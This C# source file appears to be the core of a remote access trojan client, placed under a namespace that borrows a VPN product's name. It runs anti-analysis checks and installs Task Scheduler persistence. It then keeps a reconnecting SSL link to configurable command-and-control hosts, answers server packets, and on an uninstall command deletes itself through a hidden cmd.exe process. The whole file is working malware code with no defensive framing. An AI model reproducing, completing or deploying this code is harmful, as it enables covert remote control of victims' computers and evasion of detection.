using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using mullvad.Client.Config;
using mullvad.Client.Core;
using mullvad.Client.Network;
using mullvad.Client.Setup;
using mullvad.Protocol;

namespace mullvad.Client
{
    internal static class ClientMain
    {
        [DllImport("kernel32.dll")] private static extern bool AllocConsole();

        // Set true by ClientTerminate / ClientUninstall packets to break the reconnect loop.
        internal static volatile bool ShouldExit = false;
        internal static volatile bool ShouldUninstall = false;

        internal static void Run(string[] args)
        {
            try
            {
                Loader.Trace("ClientMain.Run — start");

                AntiAnalysis.RunChecks();
                Loader.Trace("AntiAnalysis passed");

                if (Settings.DebugConsole)
                    AllocConsole();

                if (Settings.Install && Settings.UseTaskScheduler)
                {
                    try
                    {
                        var exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        TaskSchedulerHelper.RegisterTask(exe);
                    }
                    catch (Exception ex) { Loader.Trace("TaskScheduler failed — " + ex.Message); }
                }

                Loader.Trace("Entering RunForeverAsync");
                RunForeverAsync().GetAwaiter().GetResult();
                Loader.Trace("RunForeverAsync returned");
            }
            catch (Exception ex)
            {
                Loader.Trace("CRASH in ClientMain.Run — " + ex);
            }
        }

        private static async Task RunForeverAsync()
        {
            var hosts = ParseAllHosts();
            int attempt = 0;

            // Ctrl+C in debug console: suppress exit, just note it
            Console.CancelKeyPress += (_, e) => { e.Cancel = true; };

            while (!ShouldExit)
            {
                var (host, port) = hosts[attempt % hosts.Length];
                attempt++;

                using var connection = new ServerConnection(host, port);
                using var cts        = new CancellationTokenSource();

                connection.Disconnected += ex =>
                {
                    Log("WARN", $"Disconnected: {ex?.Message ?? "connection closed"}");
                    cts.Cancel();
                };

                connection.PacketReceived += packet =>
                {
                    Log("RECV", $"{packet.Type,-12} {packet.Json}");
                };

                bool connected = false;
                try
                {
                    Log("INFO", $"Connecting to {host}:{port} ...");
                    await connection.ConnectAsync(cts.Token);
                    Log("OK",   "SSL handshake complete");

                    await connection.SendHandshakeAsync();
                    Log("SEND", "Handshake sent");

                    connected = true;
                    attempt   = 0;

                    while (!cts.Token.IsCancellationRequested)
                    {
                        await Task.Delay(30_000, cts.Token);
                        await connection.SendAsync(Packet.Create(PacketType.Ping));
                        Log("SEND", "Ping");
                    }
                }
                catch (OperationCanceledException) { }
                catch (Exception ex)
                {
                    Log("ERR", ex.Message);
                }

                if (ShouldExit) break;

                Log("INFO", connected ? "Disconnected. Reconnecting in 5s..." : "Connection failed. Retrying in 10s...");

                int delay = connected ? 5_000 : Math.Min(10_000 * attempt, 60_000);
                try { await Task.Delay(delay); } catch { }
            }

            if (ShouldUninstall)
            {
                try
                {
                    var exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName  = "cmd.exe",
                        Arguments = $"/c timeout /t 2 /nobreak >nul & del /f /q \"{exe}\"",
                        WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                    });
                }
                catch { }
            }
        }

        private static (string host, int port)[] ParseAllHosts()
        {
            try
            {
                var entries = Settings.RawHosts.Split('|');
                var result  = new System.Collections.Generic.List<(string, int)>();
                foreach (var entry in entries)
                {
                    var part  = entry.Trim();
                    var colon = part.LastIndexOf(':');
                    if (colon < 0) { result.Add((part, 7777)); continue; }
                    if (int.TryParse(part.Substring(colon + 1), out int p))
                        result.Add((part.Substring(0, colon), p));
                }
                return result.Count > 0 ? result.ToArray() : new[] { ("127.0.0.1", 7777) };
            }
            catch { return new[] { ("127.0.0.1", 7777) }; }
        }

        private static void Log(string level, string message)
        {
            var time = DateTime.Now.ToString("HH:mm:ss.fff");

            Loader.Trace($"[{level}] {message}");

            Console.ResetColor();
            Console.Write(time + " ");
            switch (level)
            {
                case "OK":   Console.ForegroundColor = ConsoleColor.Green;   Console.Write("[+] "); break;
                case "ERR":  Console.ForegroundColor = ConsoleColor.Red;     Console.Write("[!] "); break;
                case "WARN": Console.ForegroundColor = ConsoleColor.Yellow;  Console.Write("[~] "); break;
                case "SEND": Console.ForegroundColor = ConsoleColor.Cyan;    Console.Write("[>] "); break;
                case "RECV": Console.ForegroundColor = ConsoleColor.Magenta; Console.Write("[<] "); break;
                default:     Console.ForegroundColor = ConsoleColor.Gray;    Console.Write("[*] "); break;
            }
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }
}
